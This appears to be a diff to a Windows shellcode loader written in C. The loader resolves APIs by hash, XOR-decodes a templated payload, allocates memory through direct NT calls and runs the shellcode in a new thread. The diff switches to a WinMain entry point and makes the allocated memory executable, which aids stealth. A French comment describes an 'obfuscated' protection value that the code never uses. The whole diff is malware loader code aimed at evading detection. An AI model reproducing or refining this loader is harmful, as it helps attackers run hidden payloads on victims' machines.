@@ -448,7 +448,8 @@ FARPROC CustomGetProcAdress(IN HMODULE hModule, unsigned int function_hash) {
     return function_base;
 }
 
-void main() {
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
+    LPSTR lpCmdLine, int nCmdShow) {
     
     unsigned char payload[] = "%SHELLCODE%";
     BYTE key = %XOR_KEY%;
@@ -504,8 +505,10 @@ void main() {
 
 
     // Allocating executable memory
-    _NtAlocVirtMem((HANDLE)-1, &exec, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    
+    // Calculer la valeur de PAGE_READWRITE de manière obfusquée
+    ULONG readWriteProtection = 1 + 1 + 2;  // Cela donne 0x04 (PAGE_READWRITE)
+    _NtAlocVirtMem((HANDLE)-1, &exec, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
     XOR(payload,sizeof(payload),key);
 
     // Copy shellcode into allocated memory
@@ -519,5 +522,7 @@ void main() {
 
     // Waiting for thread to finish
     _NtWaitForSingleObj(th, FALSE, NULL);
+
+    return 0;
 }
 
